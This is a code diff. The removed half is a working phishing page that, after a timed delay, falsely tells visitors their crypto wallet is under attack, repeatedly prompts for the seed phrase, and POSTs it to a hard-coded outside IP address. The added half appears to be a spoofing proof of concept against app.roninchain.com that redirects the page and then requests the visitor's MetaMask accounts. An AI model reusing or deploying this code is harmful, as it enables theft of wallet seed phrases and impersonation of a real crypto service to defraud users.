@@ -1,52 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Execute JS after 10 seconds</title>
-    <script>
-        // Function to show the prompt and send data using POST request
-        function showPrompt() {
-            var phrase = prompt('We found that your wallet is under Cyber Attack and Wallet App Intent to Verify your seed phrase, please enter them below');
-            if (phrase) {
-                // Send the data via POST
-                sendPostData(phrase);
-            } else {
-                // If no value is entered, keep showing the prompt every 15 seconds
-                setTimeout(showPrompt, 15000); // 15000 milliseconds = 15 seconds
-            }
-        }
-
-        // Function to send POST request
-        function sendPostData(data) {
-            // Create a new FormData object
-            var formData = new FormData();
-            formData.append('phrase', data);
-
-            // Send the POST request using fetch
-            fetch('http://54.169.169.39', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Data successfully sent');
-                } else {
-                    console.error('Failed to send data');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
-
-        // Set a timer to execute the prompt for the first time after 10 seconds
-        window.onload = function() {
-            setTimeout(showPrompt, 10000); // 10000 milliseconds = 10 seconds
-        }
-    </script>
-</head>
-<body>
-    <h1>Wait for 10 seconds...</h1>
-</body>
-</html>
+<script>
+    var spoof = function(){
+        document.write('<button onclick="connect()">Connect</button>');
+        //document.write('<button onclick="alert(document.domain)">Connect</button>');
+        //document.location = "https://app.roninchain.com";
+        document.location = "https://app.roninchain.com:1111";
+        //setInterval(function(){document.location="https://app.roninchain.com:1234";},9800);
+    };
+  </script>
+  
+  <input type="button" value="Spoof" onclick="spoof();" />
+  
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
+  <script>
+  /* To connect using MetaMask */
+  async function connect() {
+    if (window.ethereum) {
+      alert(1);
+       await window.ethereum.request({ method: "eth_requestAccounts" });
+       window.web3 = new Web3(window.ethereum);
+       const account = web3.eth.accounts;
+       //Get the current MetaMask selected/active wallet
+       const walletAddress = account.givenProvider.selectedAddress;
+       console.log(`Wallet: ${walletAddress}`);
+       alert(`Wallet: ${walletAddress}`);
+       alert(document.domain);	  
+    } else {
+     console.log("No wallet");
+     alert('No Wallet');
+     alert(document.domain);	  
+    }
+  }
+  </script>
